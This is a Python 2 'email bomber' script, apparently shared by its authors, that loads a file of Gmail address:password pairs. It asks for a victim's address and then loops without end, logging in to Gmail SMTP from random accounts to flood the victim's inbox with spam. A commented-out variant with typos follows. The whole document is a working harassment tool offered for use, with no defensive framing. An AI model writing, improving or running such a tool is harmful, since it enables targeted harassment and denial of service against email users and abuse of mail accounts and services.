#!/usr/bin/python
#coding: utf-8

# ( -- IMPORTS -- ) #
import smtplib
import time
import random
from hashlib import *
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

# ( -- LOGO / INFO -- ) #
back = '''
   ____  _____ __  __    _    ___ _          ____   ___  __  __ ____  _____ ____  
  / __ \| ____|  \/  |  / \  |_ _| |        | __ ) / _ \|  \/  | __ )| ____|  _ \ 
 / / _` |  _| | |\/| | / _ \  | || |   _____|  _ \| | | | |\/| |  _ \|  _| | |_) |
| | (_| | |___| |  | |/ ___ \ | || |__|_____| |_) | |_| | |  | | |_) | |___|  _ < 
 \ \__,_|_____|_|  |_/_/   \_\___|_____|    |____/ \___/|_|  |_|____/|_____|_| \_\                                                                  
[$] WELCOME TO EMAIL BOMBER V1.
[$] PROGRAMMED WITH PYTHON2.
[$] RROGRAMMED BY MEAD & BUGS.
[@] FB/SIRBUGS - FB/100010261237574
'''
# ---------------------------------- ## ---------------------------------- ## ---------------------------------- #
print back
print ''
myFile = raw_input('[X] ENTER YOUR GMAILS FILE [SPLITED WITH ":"] -> ')
Reciver = raw_input('[X] ENTER SPAMMED GMAIL ACC -> ')
emails = []
for item in open(myFile,'r').readlines():
	email = item.strip()
	emails.append(email)
count = 0
subject = 'EMAIL BOMBER BY {BUGS} [HECEM/ENTOR] {MEAD}'
main = 'Ramadan Kareem !'
# ---------------------------------- ## ---------------------------------- ## ---------------------------------- #
while True:
	count+=1
	msg = MIMEMultipart('alternative')
	mail = random.choice(emails)
	email, pas = mail.split(':')
	print  '[X] LOGGING IN FROM ' + email + ':' + pas
	msg["From"] = email
	msg["Subject"] = subject
	msg["To"] = Reciver
	myText = msg.attach(MIMEText(str(md5(main).hexdigest()) , 'plain'))
	try:
		server = smtplib.SMTP('smtp.gmail.com' , 587)
		server.ehlo()
		server.starttls()
		server.login(email ,pas)
		server.sendmail(email , Reciver , msg.as_string())
		print '[X] SPAM MESSAGE NUM ' + str(count) + ' HAS BEEN SENT.'
	except (IOError, TypeError, smtplib.SMTPAuthenticationError):
		print '[X] ERROR, TYE AGAIN OR ACCESS THE UNSAFE APPS FROM YOUR GMAIL.'
# ---------------------------------- ## ---------------------------------- ## ---------------------------------- #
# AN OTHER WA TO MAKE THE SCRIPT ..
# // -------------------------------------- \\ #

# while True:
# 	mail = random.choice(emails)
# 	email, pas = str(mail.split(":"))
# 	server = smtplib.SMTP('smtp.gmail.com', 587)
# 	server.ehlo()
# 	srever.starttls()
# 	server.login(email, pas)
# 	content = str(md5(main))
# 	#server.sendmail('from', 'reciver', 'content')
# 	server.sendmail(email, dd, content)
# 	server.close()
